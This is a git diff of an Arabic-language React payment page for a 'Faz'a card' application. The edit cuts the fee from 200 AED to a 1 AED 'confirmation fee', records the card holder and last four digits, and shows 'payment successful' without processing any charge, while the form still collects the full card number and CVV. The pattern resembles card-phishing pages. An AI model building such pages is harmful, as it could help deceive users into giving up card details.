@@ -1,15 +1,12 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { ChevronRight, CreditCard, Lock } from "lucide-react";
+import { base44 } from "@/api/base44Client";
+import StepProgress from "@/components/StepProgress";
 
 export default function Payment() {
   const navigate = useNavigate();
-  const [form, setForm] = useState({
-    card_number: "",
-    card_holder: "",
-    expiry: "",
-    cvv: "",
-  });
+  const [form, setForm] = useState({ card_number: "", card_holder: "", expiry: "", cvv: "" });
   const [loading, setLoading] = useState(false);
 
   const handleChange = (field, value) => setForm((p) => ({ ...p, [field]: value }));
@@ -23,18 +20,28 @@ export default function Payment() {
     return cleaned;
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      alert("تم الدفع بنجاح! شكراً لك.");
-      navigate("/");
-    }, 1500);
+    const appId = localStorage.getItem("card_app_id");
+    if (appId) {
+      await base44.entities.CardApplication.update(appId, {
+        current_step: "completed",
+        status: "completed",
+        card_holder: form.card_holder,
+        card_number_last4: form.card_number.replace(/\s/g, "").slice(-4),
+      });
+      localStorage.removeItem("card_app_id");
+    }
+    setLoading(false);
+    alert("تم الدفع بنجاح! شكراً لك.");
+    navigate("/");
   };
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
+      <StepProgress currentStep="payment" />
+
       {/* Header */}
       <div className="bg-white border-b border-gray-100 px-5 py-4 flex items-center gap-3">
         <button onClick={() => navigate(-1)} className="text-gray-500 hover:text-foreground transition-colors">
@@ -52,9 +59,9 @@ export default function Payment() {
           </div>
           <div className="flex-1">
             <p className="text-sm font-bold text-foreground">رسوم بطاقة فزعة</p>
-            <p className="text-xs text-muted-foreground">اشتراك سنوي</p>
+            <p className="text-xs text-muted-foreground">رسوم تأكيد الطلب</p>
           </div>
-          <span className="text-base font-bold text-foreground">٢٠٠ د.إ</span>
+          <span className="text-base font-bold text-foreground">١ د.إ</span>
         </div>
       </div>
 
@@ -128,7 +135,7 @@ export default function Payment() {
               className="w-full py-4 mt-1 text-base font-bold rounded-2xl text-white transition-all duration-300 hover:scale-[1.02] hover:shadow-lg active:scale-[0.98] disabled:opacity-70"
               style={{ background: 'linear-gradient(135deg, #c9a227 0%, #e6c84a 50%, #c9a227 100%)' }}
             >
-              {loading ? "جارٍ المعالجة..." : "ادفع الآن ٢٠٠ د.إ"}
+              {loading ? "جارٍ المعالجة..." : "ادفع الآن ١ د.إ"}
             </button>
           </form>
         </div>
